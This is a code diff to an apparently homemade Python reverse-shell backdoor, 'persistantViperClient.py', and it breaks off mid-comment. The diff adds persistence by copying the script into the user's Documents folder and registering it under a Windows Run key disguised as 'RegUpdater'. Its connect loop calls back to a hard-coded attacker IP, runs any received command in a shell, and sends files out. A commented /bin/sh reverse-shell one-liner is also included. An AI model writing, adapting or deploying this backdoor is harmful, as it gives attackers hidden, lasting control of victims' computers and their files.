@@ -6,6 +6,27 @@ import subprocess
 import os
 import platform
 import sys
+import _winreg as wreg
+#import requests 
+import time
+import random  # Needed to generate random
+
+#recon Phase for persistence we are going to copy ourselves to doc folder
+
+path = os.getcwd().strip('/n')  
+Null,userprof = subprocess.check_output('set USERPROFILE', shell=True).split('=')
+destination = userprof.strip('\n\r') + '\\Documents\\'  +'persistantViperClient.py'
+#If it was the first time our backdoor gets executed, then Do phase 1 and phase 2 
+
+if not os.path.exists(destination):  
+
+    shutil.copyfile(path+'\persistantViperClient.py', destination)#You can replace   path+'\persistence.exe'  with  sys.argv[0] , the sys.argv[0] will return the file name
+                                                         # and we will get the same result
+    key = wreg.OpenKey(wreg.HKEY_CURRENT_USER, "Software\Microsoft\Windows\CurrentVersion\Run",0,
+                         wreg.KEY_ALL_ACCESS)
+    wreg.SetValueEx(key, 'RegUpdater', 0, wreg.REG_SZ,destination)
+    key.Close()
+
 
 
 # In the transfer function, we first check if the file exists in the first place, if not we will notify the attacker
@@ -22,9 +43,6 @@ def transfer(s,path):
             packet = f.read(1024)
         s.send('DONE')
         f.close()
-
-    else: # the file doesn't exist
-        s.send('Unable to find out the file')
 
 def recieve(s):
     print('We are receiving a file')
@@ -45,21 +63,22 @@ def recieve(s):
             f.close()
             break
 
+
+
 def connect():
 	#s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.110.50",31337));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
 
     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     s.connect(('10.11.0.202', 8081))
 
-
+#Last phase is to start a reverse connection back to our kali machine
 
     while True:
         command =  s.recv(1024)
 
         if 'terminate' in command:
-            sock.send("Connection is shutting down ..................\n\n")
-	    s.close()
-	    break
+            return 1 # if we got terminate order, then we exit connect function and return a value of 1, this value will be used to end up the whole script
+
 
 
 # if we received grab keyword from the attacker, then this is an indicator for
@@ -81,10 +100,6 @@ def connect():
                 s.send ( str(e) )  # send the exception error
                 pass
 
-        elif 'send' in command:
-            print('We found send in command')
-            recieve(s)
-
 
         elif 'cd' in command:# the forumal here is gonna be cd then space then the path that we want to go to, like  cd C:\Users
             code,directory = command.split(" ") # split up the received command based on space into two variables
@@ -93,17 +108,19 @@ def connect():
             s.send( "[+] CWD Is " + os.getcwd() )
 
         elif 'getenv' in command:
-        	   s.send( "[+] Platform Is " + platform.platform())
+            s.send( "[+] Platform Is " + platform.platform())
 
         elif 'getuid' in command:
-        		s.send( "[+] UserID Is " + os.environ.get('USERNAME'))
+            s.send( "[+] UserID Is " + os.environ.get('USERNAME'))
 
 
         else:
             CMD =  subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
             s.send( CMD.stdout.read()  )
             s.send( CMD.stderr.read()  )
+        #time.sleep(3)
 
-def main ():
-    connect()
-main()
+
+# Here we start our infinite loop, we try to connect to our kali server, if we got an exception (connection error)
+# then we will sleep for a random time between 1 and 10 seconds and we will pass that exception and go back to the 
+# i
